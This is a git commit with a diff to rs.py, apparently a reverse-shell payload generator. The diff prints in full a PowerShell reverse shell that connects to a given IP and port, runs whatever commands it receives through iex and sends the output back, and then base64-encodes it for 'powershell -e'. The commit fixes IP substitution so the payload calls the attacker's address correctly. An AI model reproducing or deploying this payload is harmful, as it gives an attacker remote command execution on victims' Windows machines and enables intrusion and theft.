a3c5fc26c0ace57ca1adff4d3c3e20a6a78e0581
Dvir S <dviros@me.com>
2020-12-26 23:04:07 +0000

    Update rs.py

--- rs.py
+++ rs.py
@@ -84,7 +84,7 @@ def print_shell(ip,port,choice):
 		
 	elif(choice == '9'):
 		payload = '$client = New-Object System.Net.Sockets.TCPClient("%s",%d);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
-		payload = payload % ("{ip}", port)
+		payload = payload % (ip, port)
 		cmdline = "powershell -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
         
 		print(Fore.BLUE, '[+] Powershell Payload')
